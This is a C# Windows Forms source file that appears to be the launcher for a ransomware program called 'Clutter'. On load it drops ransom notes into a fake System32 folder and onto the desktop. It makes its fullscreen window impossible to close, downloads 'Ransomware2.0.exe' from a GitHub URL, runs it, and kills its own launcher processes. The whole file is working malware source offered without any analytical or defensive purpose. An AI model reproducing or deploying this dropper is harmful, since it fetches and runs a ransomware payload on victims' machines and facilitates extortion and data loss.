using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace launcher2._0
{
    public partial class launcher2 : Form
    {
        public launcher2()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        private void launcher2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void launcher2_Load(object sender, EventArgs e)
        {

            Directory.CreateDirectory("C:\\Program Files\\System32"); //Create Folder
            File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by Clutter, good luck..."); //Create text file :-)
            this.Left = 0; //Make 0 size
            this.Top = 0; //Make 0 size
            this.Width = Screen.PrimaryScreen.Bounds.Width; //Make 0 size
            this.Height = Screen.PrimaryScreen.Bounds.Height;

            string path_cache = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //define path on desktop
            string existfile = path_cache + @"\._cache_DCQPKX.exe"; //define for kill process
            if (!File.Exists(existfile))
            {
                string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQPKX.exe"))
                {
                    streamWriter.WriteLine("Ur files has been locked :-)"); //text for file
                }
            }

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt")) //Create file
            {
                streamWriter.WriteLine("Ur files has been locked :-)"); //Text for file
            }

            ServicePointManager.Expect100Continue = true; //Make protocol for donwload file from github
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://github.com/Aossser/Auoo_main/blob/main/Ransomware2.0.exe", @"C:\Program Files\System32\Ransomware2.0.exe");

            Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");

            Process[] _process = null;
            _process = Process.GetProcessesByName("DCQPKX"); //kill laucher
            foreach (Process proces in _process)
            {
                proces.Kill();
            }
            Process[] _process2 = null;
            _process2 = Process.GetProcessesByName("._cache_DCQPKX"); //If exist cache virus file, kill too
            foreach (Process proces2 in _process2)
            {
                proces2.Kill();
            }

        }
    }
}
